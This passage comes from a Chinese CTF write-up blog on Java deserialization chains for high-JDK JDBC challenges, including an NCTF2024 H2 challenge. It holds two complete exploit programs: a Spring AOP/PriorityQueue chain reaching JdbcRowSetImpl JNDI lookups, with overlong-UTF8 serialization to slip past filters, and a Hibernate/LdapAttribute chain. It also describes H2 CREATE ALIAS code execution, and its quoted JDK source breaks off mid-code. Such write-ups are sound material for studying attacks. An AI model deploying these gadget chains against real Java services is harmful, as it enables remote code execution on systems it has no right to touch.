class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-type">JdbcRowSetImpl</span> <span class="hljs-variable">jdbcRowSet</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JdbcRowSetImpl</span>();<br>        jdbcRowSet.setDataSourceName(<span class="hljs-string">&quot;ldap://127.0.0.1:1389/Deserialize/Jackson/Command/calc.exe&quot;</span>);<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> jdbcRowSet.getClass().getMethod(<span class="hljs-string">&quot;getDatabaseMetaData&quot;</span>);<br>        System.out.println(method);<br>        <span class="hljs-type">SingletonAspectInstanceFactory</span> <span class="hljs-variable">factory</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SingletonAspectInstanceFactory</span>(jdbcRowSet);<br>        <span class="hljs-type">AspectJAroundAdvice</span> <span class="hljs-variable">advice</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AspectJAroundAdvice</span>(method,<span class="hljs-keyword">new</span> <span class="hljs-title class_">AspectJExpressionPointcut</span>(),factory);<br>        <span class="hljs-type">Proxy</span> <span class="hljs-variable">proxy1</span> <span class="hljs-operator">=</span> (Proxy) getAProxy(advice,Advice.class);<br>        <span class="hljs-type">Proxy</span> <span class="hljs-variable">finalproxy</span> <span class="hljs-operator">=</span> (Proxy) getBProxy(proxy1,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Comparator.class&#125;);<br>        <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">PQ_test</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(<span class="hljs-number">1</span>);<br>        PQ_test.add(<span class="hljs-number">1</span>);<br>        PQ_test.add(<span class="hljs-number">2</span>);<br><br>        setFieldValue(PQ_test,<span class="hljs-string">&quot;comparator&quot;</span>,finalproxy);<br>        setFieldValue(PQ_test,<span class="hljs-string">&quot;queue&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;proxy1,proxy1&#125;);<br><br>        System.out.println(Base64.getEncoder().encodeToString(serialize(PQ_test)));<br><br>        deserialize(serialize(PQ_test));<br>        <span class="hljs-comment">//deserialize_waf(serialize(PQ_test));</span><br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">getBProxy</span><span class="hljs-params">(Object obj,Class[] clazzs)</span> <span class="hljs-keyword">throws</span> Exception<br>    &#123;<br>        <span class="hljs-type">AdvisedSupport</span> <span class="hljs-variable">advisedSupport</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AdvisedSupport</span>();<br>        advisedSupport.setTarget(obj);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;org.springframework.aop.framework.JdkDynamicAopProxy&quot;</span>).getConstructor(AdvisedSupport.class);<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> (InvocationHandler) constructor.newInstance(advisedSupport);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">proxy</span> <span class="hljs-operator">=</span> Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), clazzs, handler);<br>        <span class="hljs-keyword">return</span> proxy;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">getAProxy</span><span class="hljs-params">(Object obj,Class&lt;?&gt; clazz)</span> <span class="hljs-keyword">throws</span> Exception<br>    &#123;<br>        <span class="hljs-type">AdvisedSupport</span> <span class="hljs-variable">advisedSupport</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AdvisedSupport</span>();<br>        advisedSupport.setTarget(obj);<br>        <span class="hljs-type">AbstractAspectJAdvice</span> <span class="hljs-variable">advice</span> <span class="hljs-operator">=</span> (AbstractAspectJAdvice) obj;<br><br>        <span class="hljs-type">DefaultIntroductionAdvisor</span> <span class="hljs-variable">advisor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultIntroductionAdvisor</span>((Advice) getBProxy(advice, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;MethodInterceptor.class, Advice.class&#125;));<br>        advisedSupport.addAdvisor(advisor);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;org.springframework.aop.framework.JdkDynamicAopProxy&quot;</span>).getConstructor(AdvisedSupport.class);<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> (InvocationHandler) constructor.newInstance(advisedSupport);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">proxy</span> <span class="hljs-operator">=</span> Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;clazz&#125;, handler);<br>        <span class="hljs-keyword">return</span> proxy;<br>    &#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] serialize(Object obj) <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">arr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-keyword">try</span> (<span class="hljs-type">UTF8OverlongObjectOutputStream</span> <span class="hljs-variable">output</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UTF8OverlongObjectOutputStream</span>(arr))&#123;<br>            output.writeObject(obj);<br>        &#125;<br>        <span class="hljs-keyword">return</span> arr.toByteArray();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">deserialize</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] arr)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">try</span> (<span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">input</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(arr)))&#123;<br>            <span class="hljs-keyword">return</span> input.readObject();<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p><img src="/2025/03/31/%E6%9D%A5%E8%87%AA%E4%B8%89%E9%81%93%E9%AB%98%E7%89%88%E6%9C%ACJDK%E7%9A%84JDBC%E8%BF%9E%E6%89%93combo/image-20250331200208073.png" alt="image-20250331200208073"></p><p>当时比赛不出网，jar包的编译版本虽然是JDK11，但是还没有受到强制类隔离的要求，所以可以随便打<code>Jackson</code>反序列化这些，或者是再走一次AOP链但触发类换成可RCE的<code>TemplateImpl</code>类，这里随便打一个啥内存马应该都可以。</p><p>这位师傅还提到了hsql的二次反序列化，这个思路也很不错，打jndi_Reference触发<code>DruidDataSourceFactory</code>的getObjectInstance方法来打hsql-JDBC，触发hsql里的SerializationUtils二次反序列化实现RCE，有兴趣可以看看原文。</p><p>放题目中的JDK11环境也能出：</p><p><img src="/2025/03/31/%E6%9D%A5%E8%87%AA%E4%B8%89%E9%81%93%E9%AB%98%E7%89%88%E6%9C%ACJDK%E7%9A%84JDBC%E8%BF%9E%E6%89%93combo/image-20250331200045561.png" alt="image-20250331200045561"></p><h4 id="法二，LdapAttribute"><a href="#法二，LdapAttribute" class="headerlink" title="法二，LdapAttribute"></a>法二，<code>LdapAttribute</code></h4><p>其次potat0w0师傅的从<code>LdapAttributegetAttributeDefinition()</code>打到jndi也是很好的方法，因为题目的依赖中存在hibernate漏洞版本，想办法出发到它的hashCode()就行了：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Exp2</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-type">Hashtable</span> <span class="hljs-variable">hashtable</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hashtable</span>();<br><br>        <span class="hljs-type">ComponentType</span> <span class="hljs-variable">componentType</span> <span class="hljs-operator">=</span> (ComponentType) createObjWithoutConstructor(ComponentType.class);<br><br>        setField(componentType,<span class="hljs-string">&quot;propertySpan&quot;</span>,<span class="hljs-number">2</span>);<br><br>        <span class="hljs-comment">//Users users = new Users();</span><br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c1</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;com.sun.jndi.ldap.LdapAttribute&quot;</span>);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c2</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;javax.naming.directory.BasicAttribute&quot;</span>);<br><span class="hljs-comment">//</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">ldap</span> <span class="hljs-operator">=</span> createObjWithConstructor(c1,c2,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;test&quot;</span>&#125;);<br>        setField(ldap,<span class="hljs-string">&quot;rdn&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">CompositeName</span>(<span class="hljs-string">&quot;a//b&quot;</span>));<br><span class="hljs-comment">//        setField(ldap,&quot;baseCtx&quot;,new InitialContext());</span><br><br>        setField(ldap,<span class="hljs-string">&quot;baseCtxURL&quot;</span>,<span class="hljs-string">&quot;ldap://127.0.0.1:50389&quot;</span>);<br><br>        <span class="hljs-type">TypedValue</span> <span class="hljs-variable">typedValue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TypedValue</span>(componentType,ldap);<br><br>        <span class="hljs-type">PojoComponentTuplizer</span> <span class="hljs-variable">pojoComponentTuplizer</span> <span class="hljs-operator">=</span> (PojoComponentTuplizer) createObjWithoutConstructor(PojoComponentTuplizer.class);<br><br>        Class&lt;?&gt; c = AbstractComponentTuplizer.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;getters&quot;</span>);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(pojoComponentTuplizer,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Getter</span>[]&#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">GetterMethodImpl</span>(Object.class,<span class="hljs-string">&quot;qwq&quot;</span>, c1.getDeclaredMethod(<span class="hljs-string">&quot;getAttributeDefinition&quot;</span>))&#125;);<br><br>        setField(componentType,<span class="hljs-string">&quot;componentTuplizer&quot;</span>,pojoComponentTuplizer);<br><br><br>        hashtable.put(<span class="hljs-number">1</span>,<span class="hljs-number">111</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tableField</span> <span class="hljs-operator">=</span> Hashtable.class.getDeclaredField(<span class="hljs-string">&quot;table&quot;</span>);<br>        tableField.setAccessible(<span class="hljs-literal">true</span>);<br>        Object[] table = (Object[]) tableField.get(hashtable);<br>        <span class="hljs-keyword">for</span> (Object entry: table)&#123;<br><span class="hljs-comment">//            System.out.println(entry);</span><br>            <span class="hljs-keyword">if</span> (entry != <span class="hljs-literal">null</span>)&#123;<br>                setField(entry,<span class="hljs-string">&quot;key&quot;</span>,typedValue);<br>            &#125;<br>        &#125;<br><br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">string</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(ser(hashtable));<br><br>        System.out.println(string);<br><br>        unser(Base64.getDecoder().decode(string));<br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> &lt;T&gt; T <span class="hljs-title function_">createObjWithConstructor</span> <span class="hljs-params">(Class&lt;T&gt; clazz,Class&lt;? <span class="hljs-built_in">super</span> T&gt; superClazz,Class&lt;?&gt;[] argsTypes,Object[] argsValues)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        Constructor&lt;?<span class="hljs-built_in">super</span> T&gt; constructor = superClazz.getDeclaredConstructor(argsTypes);<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br>        Constructor&lt;?&gt; constructor1 = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(clazz,constructor);<br>        constructor1.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-keyword">return</span> (T) constructor1.newInstance(argsValues);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setField</span><span class="hljs-params">(Object object,String fieldName,Object value)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        Class&lt;?&gt; c = object.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> c.getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(object,value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">createObjWithoutConstructor</span><span class="hljs-params">(Class clazz)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">ReflectionFactory</span> <span class="hljs-variable">reflectionFactory</span> <span class="hljs-operator">=</span> ReflectionFactory.getReflectionFactory();<br>        Constructor&lt;Object&gt; constructor = Object.class.getDeclaredConstructor();<br>        Constructor&lt;?&gt; constructor1 = reflectionFactory.newConstructorForSerialization(clazz,constructor);<br>        constructor1.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-keyword">return</span> constructor1.newInstance();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] ser(Object o) <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br><span class="hljs-comment">//        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);</span><br>        Exp.<span class="hljs-type">UTF8OverlongObjectOutputStream</span> <span class="hljs-variable">utf8OverlongObjectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Exp</span>.UTF8OverlongObjectOutputStream(byteArrayOutputStream);<br><span class="hljs-comment">//        objectOutputStream.writeObject(o);</span><br>        utf8OverlongObjectOutputStream.writeObject(o);<br>        <span class="hljs-keyword">return</span> byteArrayOutputStream.toByteArray();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unser</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] bytes)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">byteArrayInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(bytes);<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(byteArrayInputStream);<br>        <span class="hljs-keyword">return</span> objectInputStream.readObject();<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>这里用java-chains这个工具试了试，确实也挺好用的，推荐！</p><p><img src="/2025/03/31/%E6%9D%A5%E8%87%AA%E4%B8%89%E9%81%93%E9%AB%98%E7%89%88%E6%9C%ACJDK%E7%9A%84JDBC%E8%BF%9E%E6%89%93combo/image-20250331200846114.png" alt="image-20250331200846114"></p><p><img src="/2025/03/31/%E6%9D%A5%E8%87%AA%E4%B8%89%E9%81%93%E9%AB%98%E7%89%88%E6%9C%ACJDK%E7%9A%84JDBC%E8%BF%9E%E6%89%93combo/image-20250331200938196.png" alt="image-20250331200938196"></p><p>参考：</p><p><a href="https://gsbp0.github.io/post/%E8%BD%AF%E4%BB%B6%E6%94%BB%E9%98%B2%E8%B5%9B%E7%8E%B0%E5%9C%BA%E8%B5%9B%E4%B8%8A%E5%AF%B9justdeserialize%E6%94%BB%E5%87%BB%E7%9A%84%E5%87%A0%E6%AC%A1%E5%B0%9D%E8%AF%95/#%E7%AC%AC%E4%BA%8C%E6%AD%A5">软件攻防赛现场赛上对justDeserialize攻击的几次尝试 | GSBP’s Blog</a></p><p><a href="https://blog.potatowo.top/2025/03/23/%E8%BD%AF%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E8%B5%9B2025%E5%8D%8E%E4%B8%9C%E8%B5%9B%E5%8C%BA%E5%8D%8A%E5%86%B3%E8%B5%9Bwp-web/">软件系统安全赛2025华东赛区半决赛wp-web - Potat0w0</a></p><p><a href="https://github.com/vulhub/java-chains/releases/tag/1.4.0">Release 1.4.0 · vulhub&#x2F;java-chains</a></p><h1 id="其三-NCTF2024-H2-Revenge"><a href="#其三-NCTF2024-H2-Revenge" class="headerlink" title="其三-NCTF2024 H2_Revenge"></a>其三-NCTF2024 H2_Revenge</h1><p>X1哥出的题，JDK17打H2的反序列化。</p><p>就是因为参加软件赛才没打到NCTF题，正好学弟也在问这个题的问题，看了看打了打。</p><p>题目入口很简单：</p><p><img src="/2025/03/31/%E6%9D%A5%E8%87%AA%E4%B8%89%E9%81%93%E9%AB%98%E7%89%88%E6%9C%ACJDK%E7%9A%84JDBC%E8%BF%9E%E6%89%93combo/image-20250331171307946.png" alt="image-20250331171307946"></p><p>前半段链子依然用<code>EventListenerList</code>能触发到<code>MyDataSource</code>的<code>getConnecetion()</code>：</p><p><img src="/2025/03/31/%E6%9D%A5%E8%87%AA%E4%B8%89%E9%81%93%E9%AB%98%E7%89%88%E6%9C%ACJDK%E7%9A%84JDBC%E8%BF%9E%E6%89%93combo/image-20250331171411816.png" alt="image-20250331171411816"></p><p>如果光打H2的话，后续好像直接用CREATE ALIAS创建恶意函数执行sql语句或者利用JavaScript引擎就能直接打了。但是JDK17的JavaScript引擎(Nashorn)已经被删除，而且这道题有点抽象的用了JRE，而不是完整的JDK环境，也就是说没有javac，没法给你编译了，那么创建恶意函数的方法就寄了。</p><p>但是你如果翻看H2官方文档，会发现CERATE ALIAS除了能在sql执行的时候创建恶意函数，还可以直接引用已知的Java方法，全程没有javac的参加。</p><p><a href="https://h2database.com/html/features.html">Features</a>：</p><p><img src="/2025/03/31/%E6%9D%A5%E8%87%AA%E4%B8%89%E9%81%93%E9%AB%98%E7%89%88%E6%9C%ACJDK%E7%9A%84JDBC%E8%BF%9E%E6%89%93combo/image-20250331172209936.png" alt="image-20250331172209936"></p><p>一下就变成漏洞挖掘了呢。只要是我们能找到依赖中的符合条件的静态方法就能R了。</p><p>这里的打法千奇百怪了，因为方法有很多，X1哥用的Spring的<code>ReflectUtils</code>反射调用<code>ClassPathXmlApplicationContext</code>的构造方法，但是直接执行SQL语句会报错不支持JAVA_OBJECT 与VARCHAR(CHARACTER VARYING)类型之间的转换：<a href="https://github.com/h2database/h2database/issues/3389">Data conversion error converting “JAVA_OBJECT, CHARACTER VARYING” · Issue #3389 · h2database&#x2F;h2database</a></p><p>因为<code>ReflectUtils.newInstance</code>传入的args参数是Object类型，sql文件中的<code>@url_str</code>属于VARCHAR类型。</p><p>所以必须找到一个参数类型为Object且返回值是String类型的static方法，从而间接地实现类型的转换，这里由于我还没装CodeQL和Tabby，所以就不去手动找了。这俩对Javachains的挖掘很有帮助，后面有缘搭建一下再更吧hhh。</p><p>X1哥用的<code>javax.naming.ldap.Rdn.unescapeValue</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unescapeValue</span><span class="hljs-params">(String val)</span> &#123;<br><br>            <span class="hljs-type">char</span>[] chars = val.toCharArray();<br>            <span class="hljs-type">int</span> <span class="hljs-variable">beg</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>            <span class="hljs-type">int</span> <span class="hljs-variable">end</span> <span class="hljs-operator">=</span> chars.length;<br><br>            <span class="hljs-comment">// Trim off leading and trailing whitespace.</span><br>            <span class="hljs-keyword">while</span> ((beg &lt; end) &amp;&amp; isWhitespace(chars[beg])) &#123;<br>                ++beg;<br>            &#125;<br><br>            <span class="hljs-keyword">while</span> ((beg &lt; end) &amp;&amp; isWhitespace(chars[end - <span class="hljs-number">1</span>])) &#123;<br>                --end;<br>            &#125;<br><br>            <span class="hljs-comment">// Add back the trailing whitespace with a preceding &#x27;\&#x27;</span><br>            <span class="hljs-comment">// (escaped or unescaped) that was taken off in the above</span><br>            <span class="hljs-comment">// loop. Whether or not to retain this whitespace is decided below.</span><br>            <span class="hljs-keyword">if</span> (end != chars.length &amp;&amp;<br>                    (beg &lt; end) &amp;&amp;<br>                    chars[end - <span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;\\&#x27;</span>) &#123;<br>                end++;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (beg &gt;= end) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>;<br>            &#125;<br><br>            <span class="hljs-keyword">if</span> (chars[beg] == <span class="hljs-string">&#x27;#&#x27;</span>) &#123;<br>                <span class="hljs-comment">// Value is binary (eg: &quot;#CEB1DF80&quot;).</span><br>                <span class="hljs-keyword">return</span> decodeHexPairs(chars, ++beg, end);<br>            &#125;<br><br>            <span class="hljs-comment">// Trim off quotes.</span><br>            <span class="hljs-keyword">if</span> ((chars[beg] == <span class="hljs-string">&#x27;\&quot;&#x27;</span>) &amp;&amp; (chars[end - <span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;\&quot;&#x27;</span>)) &#123;<br>                ++beg;<br>                --end;<br>            &#125;<br><br>            <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">builder</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>(end - beg);<br>            <span class="hljs-type">int</span> <span class="hljs-variable">esc</span> <span class="hljs-operator">=</span> -<span class="hljs-number">1</span>; <span class="hljs-comment">// index of the last escaped character</span><br><br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> beg; i &lt; end; i++) &#123;<br>                <span class="hljs-keyword">if</span> ((chars[i] == <span class="hljs-string">&#x27;\\&#x27;</span>) &amp;&amp; (i + <span class="hljs-number">1</span> &lt; end)) &#123;<br>                    <span class="hljs-keyword">if</span> (!Character.isLetterOrDigit(chars[i + <span class="hljs-number">1</span>])) &#123;<br>                        ++i;                            <span class="hljs-comment">// skip backslash</span><br>                        builder.append(chars[i]);       <span class="hljs-comment">// snarf escaped char</span><br>                        esc = i;<br>                    &#125; <span class="hljs-keyword">else</span> &#123;<br><br>                        <span class="hljs-comment">// Convert hex-encoded UTF-8 to 16-bit chars.</span><br>                        <span class="hljs-type">byte</span>[] utf8 = getUtf8Octets(chars, i, end);<br>                        <span class="hljs-keyword">if</span> (utf8.length &gt; <span class="hljs-number">0</span>) &#123;<br>                            <span class="hljs-keyword">try</span> &#123;<br>                                builder.append(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(utf8, <span class="hljs-string">&quot;UTF8&quot;</span>));<br>                            &#125; <span class="hljs-keyword">catch</span> (java.io.UnsupportedEncodingException e) &#123;<br>                                <span class="hljs-comment">// shouldn&#x27;t happen</span><br>                            &#125;<br>                            i += utf8.length * <span class="hljs-number">3</span> - <span class="hljs-number">1</span>;<br>                        &#125; <span class="hljs-keyword">else</span> &#123; <span class="hljs-comment">// no utf8 bytes available, invalid DN</span><br><br>                            <span class="hljs-comment">// &#x27;/&#x27; has no meaning, throw exception</span><br>                            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<br>                                <span class="hljs-string">&quot;Not a valid attribute string value:&quot;</span> +<br>                                val + <span class="hljs-string">&quot;,improper usage of backslash&quot;</span>);<br>                        &#125;<br>                    &#125;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    builder.append(chars[i]);   <span class="hljs-comment">// snarf unescaped char</span><br>                &#125;<br>            &#125;<br><br>            <span class="hljs-comment">// Get rid of the unescaped trailing whitespace with the</span><br>            <span class="hljs-comment">// preceding &#x27;\&#x27; character that was previously added back.</span><br>            <span class="hljs-type">int</span> <span class="hljs-variable">len</span> <span class="hljs-operator">=</span> builder.length();<br>            <span class="hljs-keyword">if</span> (isWhitespace(builder.charAt(len - <span class="hljs-number">1</span>)) &amp;&amp; esc != (end - <span class="hljs-number">1</span>)) &#123;<br>                builder.setLength(len - <span class="hljs-number">1</span>);<br>            &#125;<br>            <span class="hljs-keyword">return</span> builder.toString();<br>        